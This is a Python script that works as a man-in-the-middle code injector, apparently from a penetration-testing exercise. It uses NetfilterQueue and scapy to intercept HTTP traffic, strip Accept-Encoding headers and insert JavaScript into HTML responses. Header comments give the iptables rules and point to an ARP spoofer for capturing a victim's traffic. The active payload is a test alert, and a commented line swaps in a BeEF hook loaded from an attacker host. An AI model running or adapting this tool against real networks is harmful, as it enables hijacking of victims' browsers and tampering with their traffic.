# sudo iptables-legacy -I OUTPUT -j NFQUEUE --queue-num 0
# sudo iptables-legacy -I INPUT -j NFQUEUE --queue-num 0
# sudo iptables-legacy --flush
# 
# for MITM, spoof remote traffic on remote system
# sudo iptables-legacy -I FORWARD -j NFQUEUE --queue-num 0
# sudo ../arp_spoofer/main.py

from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import re


def set_load(packet, payload):
    packet[scapy.Raw].load = payload
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] HTTP Request")
                # print(scapy_packet.show())
                load = re.sub(packet_encoding, "", str(load))
                #load = re.sub(packet_encoding, "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] HTTP Response")
                #print(scapy_packet.show())
                load = str(load).replace("</body>", inject_str + "</body>")
                print(load)
                content_len_search = re.search(packet_length, load)
                if content_len_search and "text/html" in load:
                    print("\n\n[+] Injecting code")
                    content_length = content_len_search.group(1)
                    #print(f"[+] Content-Length: {content_length}")
                    new_content_length = int(content_length) + len(inject_str)
                    print(f"[+] Content-Length: {content_length}, new_value: {new_content_length}")
                    load = load.replace(content_length, str(new_content_length))
                    print("[+] Code injected\n\n")

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            #pass
            print("\n[-] unicode error stuff :-(")
        except IndexError:
            #pass
            print("\n[-] protocol error stuff :-(")
    packet.accept()
    return

server_ip = "10.0.2.6"
packet_encoding = "Accept-Encoding:.*?\\r\\n"
inject_str = "<script>alert('test');</script>"
# inject_str = f'<script src="http://{server_ip}:3000/hook.js"></script>' # BeEF hook
packet_length = "(?:Content-Length:\s)(\d*)"

try:
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except OSError as e:
    if "Are you root?" in str(e):
        print("\n[-] Permission error ... Got Root??")
except AttributeError:
    print("\n[-] Attribute error... :-(")
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... Sharting, please wait.")

print("Goodbye!")
